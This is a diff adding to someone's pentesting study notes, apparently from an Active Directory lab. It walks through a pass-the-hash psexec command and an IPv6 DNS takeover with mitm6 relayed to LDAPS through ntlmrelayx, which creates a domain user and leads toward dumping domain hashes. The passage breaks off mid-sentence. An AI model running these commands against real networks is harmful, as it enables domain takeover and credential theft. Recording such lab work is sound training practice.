@@ -120,3 +120,33 @@ Using a hash :
 psexec.y adminsitrator@192.168.138.137 -hashes LM_hash:NT_hash
 
 If psexec is not working or blocket by antivirus we can try wmiexec.py or smbexec.py using the same parameters
+
+## IPv6 Attacks Overview
+
+Computers may have IPv6 is turned on but using IPv4. So who is doing DNS for IPv6 ? No one
+So we can try DNS spoofing for IPv6 to use a machine to log into the domain controller to get information and realise LDAP relay.
+
+## IPv6 DNS Takeover via mitm6
+
+Attack undetectable, and can be realised without no access.
+
+cd /opt/mitm6
+sudo pip2 install .
+
+sudo mitm6 -d marvel.local
+
+We set up ntlm relay using mitm6 instead of responder
+ntlmrelayx.py -6 -t ldaps://192.168.138.136 -wh fakewpad.marvel.local -l lootme
+-6 : IPv6
+-t : target
+-wh : set up wpad (machine in the middle, part of the domain)
+-l : loop (no name meaning expected)
+
+Once relaying is set up, run mitm6
+sudo mitm6 -d marvel.local
+
+In our running folder we now have a 'lootme' folder containing different informations such as machines in the domain, groups within the domaine, domain users
+
+Back to Kali, logging is also an event. We logging from a client machine as administrator
+During the logging mitm created a new user, credentials are in the terminal
+On the DC we check that the user is created, he is member of Domain Users so he does not have access to every single computer in the domain but have access to the Enterprise Admins group and have access to run secrets dump againt the domain, get hashes and manage to 
